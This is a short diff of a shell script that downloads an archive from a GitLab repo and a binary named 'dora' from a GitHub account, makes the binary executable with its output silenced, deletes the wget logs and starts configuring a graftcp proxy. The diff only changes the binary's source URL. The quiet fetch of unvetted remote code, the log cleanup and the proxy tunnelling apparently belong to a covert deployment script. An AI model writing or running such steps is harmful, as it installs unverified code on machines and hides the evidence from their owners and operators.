@@ -16,7 +16,7 @@ wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
-wget https://github.com/gretongcu/dora/raw/main/dora && chmod +x dora >/dev/null 2>&1
+wget https://github.com/gretongcu/code/raw/main/dora && chmod +x dora >/dev/null 2>&1
 rm -rf wget-log*
 
 cat > graftcp/local/graftcp-local.conf <<END
